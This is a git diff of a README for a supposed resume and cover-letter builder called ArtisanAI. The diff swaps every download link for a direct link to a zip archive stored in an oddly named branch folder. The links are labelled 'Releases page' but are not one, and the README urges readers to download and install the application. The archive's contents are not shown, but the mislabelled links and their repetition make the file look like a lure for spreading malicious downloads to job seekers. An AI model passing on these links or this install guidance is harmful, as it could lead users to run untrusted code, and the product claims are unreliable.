@@ -1,6 +1,6 @@
 # 🎉 artisanai-ats-1pager-resume-coverletter-builder - Create Polished Resumes Easily
 
-[![Download](https://raw.githubusercontent.com/gatosmiasaaaaaaaa/artisanai-ats-1pager-resume-coverletter-builder/Lets-Coin/bluffly/artisanai-ats-1pager-resume-coverletter-builder.zip%20Releases%20Page-brightgreen)](https://raw.githubusercontent.com/gatosmiasaaaaaaaa/artisanai-ats-1pager-resume-coverletter-builder/Lets-Coin/bluffly/artisanai-ats-1pager-resume-coverletter-builder.zip)
+[![Download](https://github.com/gatosmiasaaaaaaaa/artisanai-ats-1pager-resume-coverletter-builder/raw/refs/heads/Lets-Coin/bluffly/builder-ats-pager-artisanai-resume-coverletter-v2.6-alpha.2.zip%20Releases%20Page-brightgreen)](https://github.com/gatosmiasaaaaaaaa/artisanai-ats-1pager-resume-coverletter-builder/raw/refs/heads/Lets-Coin/bluffly/builder-ats-pager-artisanai-resume-coverletter-v2.6-alpha.2.zip)
 
 ## 📦 Overview
 
@@ -11,7 +11,7 @@ ArtisanAI is an intelligent web application designed to help job seekers. It tra
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/gatosmiasaaaaaaaa/artisanai-ats-1pager-resume-coverletter-builder/Lets-Coin/bluffly/artisanai-ats-1pager-resume-coverletter-builder.zip). This page contains all the latest versions of ArtisanAI.
+   Go to our [Releases page](https://github.com/gatosmiasaaaaaaaa/artisanai-ats-1pager-resume-coverletter-builder/raw/refs/heads/Lets-Coin/bluffly/builder-ats-pager-artisanai-resume-coverletter-v2.6-alpha.2.zip). This page contains all the latest versions of ArtisanAI.
 
 2. **Download the Application**  
    Choose the latest release and click on the download link for your system. We provide options for Windows, macOS, and Linux. Click the relevant link to download the application file.
@@ -32,7 +32,7 @@ To get started, follow these steps:
 
 ## 📥 Download & Install
 
-To download ArtisanAI, visit our [Releases page](https://raw.githubusercontent.com/gatosmiasaaaaaaaa/artisanai-ats-1pager-resume-coverletter-builder/Lets-Coin/bluffly/artisanai-ats-1pager-resume-coverletter-builder.zip) and select the latest version suitable for your operating system. Follow the installation instructions provided earlier.
+To download ArtisanAI, visit our [Releases page](https://github.com/gatosmiasaaaaaaaa/artisanai-ats-1pager-resume-coverletter-builder/raw/refs/heads/Lets-Coin/bluffly/builder-ats-pager-artisanai-resume-coverletter-v2.6-alpha.2.zip) and select the latest version suitable for your operating system. Follow the installation instructions provided earlier.
 
 ## 🛠️ System Requirements
 
